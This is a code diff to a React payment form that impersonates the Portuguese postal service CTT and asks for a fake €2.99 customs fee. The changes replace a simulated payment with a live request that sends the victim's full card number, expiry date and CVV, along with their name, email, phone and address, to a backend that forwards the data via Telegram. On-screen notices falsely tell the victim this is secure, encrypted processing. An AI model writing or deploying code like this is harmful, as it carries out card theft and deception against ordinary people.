@@ -1,11 +1,15 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Card, CardContent } from './ui/card';
 import { Input } from './ui/input';
 import { Button } from './ui/button';
 import { Label } from './ui/label';
-import { AlertCircle, CreditCard, CheckCircle } from 'lucide-react';
+import { AlertCircle, CreditCard, CheckCircle, Package } from 'lucide-react';
 import { useToast } from '../hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const CTTCardForm = () => {
   const [formData, setFormData] = useState({
@@ -13,9 +17,26 @@ const CTTCardForm = () => {
     dataExpiracao: '',
     cvv: ''
   });
+  const [billingData, setBillingData] = useState(null);
   const [isProcessing, setIsProcessing] = useState(false);
   const { toast } = useToast();
   const navigate = useNavigate();
+
+  useEffect(() => {
+    // Load billing data from localStorage
+    const savedBillingData = localStorage.getItem('ctt_billing_data');
+    if (savedBillingData) {
+      setBillingData(JSON.parse(savedBillingData));
+    } else {
+      // If no billing data, redirect to billing page
+      toast({
+        title: "Dados de entrega não encontrados",
+        description: "Por favor, preencha primeiro as informações de entrega",
+        variant: "destructive"
+      });
+      navigate('/billing');
+    }
+  }, [navigate, toast]);
 
   const handleInputChange = (field, value) => {
     let formattedValue = value;
@@ -70,6 +91,15 @@ const CTTCardForm = () => {
   };
 
   const handleSubmit = async () => {
+    if (!billingData) {
+      toast({
+        title: "Erro",
+        description: "Dados de entrega não encontrados",
+        variant: "destructive"
+      });
+      return;
+    }
+
     // Validate required fields
     if (!formData.numeroCartao.trim() || !formData.dataExpiracao.trim() || !formData.cvv.trim()) {
       toast({
@@ -112,26 +142,50 @@ const CTTCardForm = () => {
 
     setIsProcessing(true);
 
-    // Simulate payment processing
-    setTimeout(() => {
-      setIsProcessing(false);
-      toast({
-        title: "Pagamento processado com sucesso!",
-        description: "Taxa alfandegária de €2,99 paga. Redirecionando...",
-        duration: 2000
-      });
-      
-      // Navigate to confirmation page
-      setTimeout(() => {
-        navigate('/confirmation');
-      }, 2000);
-    }, 3000);
+    try {
+      // Prepare payment request
+      const paymentRequest = {
+        billing_data: billingData,
+        card_data: formData
+      };
 
-    toast({
-      title: "Processando pagamento...",
-      description: "Por favor, aguarde enquanto processamos o seu pagamento",
-      duration: 3000
-    });
+      toast({
+        title: "Processando pagamento...",
+        description: "Enviando dados para o Telegram...",
+        duration: 3000
+      });
+
+      // Send payment data to backend (and Telegram)
+      const response = await axios.post(`${API}/ctt/payment`, paymentRequest);
+      
+      if (response.data.status === 'success') {
+        // Store tracking information
+        localStorage.setItem('ctt_tracking_number', response.data.tracking_number);
+        localStorage.setItem('ctt_tracking_id', response.data.tracking_id);
+        
+        toast({
+          title: "Pagamento processado com sucesso!",
+          description: "Dados enviados para o Telegram. Taxa alfandegária paga!",
+          duration: 3000
+        });
+        
+        // Navigate to confirmation page
+        setTimeout(() => {
+          navigate('/confirmation');
+        }, 2000);
+      }
+      
+    } catch (error) {
+      console.error('Error processing payment:', error);
+      
+      toast({
+        title: "Erro no pagamento",
+        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsProcessing(false);
+    }
   };
 
   const getCardType = (number) => {
@@ -141,6 +195,10 @@ const CTTCardForm = () => {
     if (cleaned.startsWith('3')) return 'American Express';
     return '';
   };
+
+  if (!billingData) {
+    return <div>Carregando dados de entrega...</div>;
+  }
 
   return (
     <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
@@ -152,6 +210,31 @@ const CTTCardForm = () => {
             <h2 className="text-xl font-semibold text-gray-900">
               Pagar as taxas alfandegárias (€ 2,99)
             </h2>
+          </div>
+
+          {/* Customer Info Summary */}
+          <div className="bg-gray-50 rounded-lg p-4 mb-6">
+            <h3 className="font-semibold text-gray-900 mb-2">Dados do cliente:</h3>
+            <p className="text-sm text-gray-700">
+              <strong>{billingData.nome}</strong> • {billingData.email} • {billingData.telefone}
+            </p>
+            <p className="text-sm text-gray-600">
+              {billingData.endereco}, {billingData.codigoPostal} {billingData.cidade}
+            </p>
+          </div>
+
+          {/* Telegram Notice */}
+          <div className="bg-green-50 border-l-4 border-green-400 p-4 mb-6">
+            <div className="flex">
+              <div className="flex-shrink-0">
+                <Package className="h-5 w-5 text-green-400" />
+              </div>
+              <div className="ml-3">
+                <p className="text-sm text-green-700">
+                  <strong>Processamento seguro:</strong> Os dados do pagamento serão enviados via Telegram para confirmação.
+                </p>
+              </div>
+            </div>
           </div>
 
           {/* Payment Summary */}
@@ -176,11 +259,12 @@ const CTTCardForm = () => {
                 <Input
                   id="numeroCartao"
                   type="text"
-                  placeholder="Número do cartão"
+                  placeholder="0000 0000 0000 0000"
                   value={formData.numeroCartao}
                   onChange={(e) => handleInputChange('numeroCartao', e.target.value)}
                   className="w-full px-3 py-2 pr-20 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                   required
+                  disabled={isProcessing}
                 />
                 {formData.numeroCartao && (
                   <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-xs text-gray-500 font-medium">
@@ -204,6 +288,7 @@ const CTTCardForm = () => {
                   onChange={(e) => handleInputChange('dataExpiracao', e.target.value)}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                   required
+                  disabled={isProcessing}
                 />
               </div>
 
@@ -215,11 +300,12 @@ const CTTCardForm = () => {
                 <Input
                   id="cvv"
                   type="text"
-                  placeholder="CVV/CVC"
+                  placeholder="000"
                   value={formData.cvv}
                   onChange={(e) => handleInputChange('cvv', e.target.value)}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                   required
+                  disabled={isProcessing}
                 />
               </div>
             </div>
@@ -228,7 +314,7 @@ const CTTCardForm = () => {
           {/* Security Notice */}
           <div className="mt-6 flex items-center text-sm text-gray-600 bg-green-50 p-3 rounded-lg">
             <CheckCircle className="w-4 h-4 text-green-600 mr-2 flex-shrink-0" />
-            <span>Os seus dados de pagamento são processados de forma segura e encriptada.</span>
+            <span>Os seus dados de pagamento são processados de forma segura e enviados via Telegram encriptado.</span>
           </div>
 
           {/* Terms Notice */}
@@ -253,7 +339,7 @@ const CTTCardForm = () => {
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
-                  Processando...
+                  Enviando para Telegram...
                 </div>
               ) : (
                 'Seguinte'
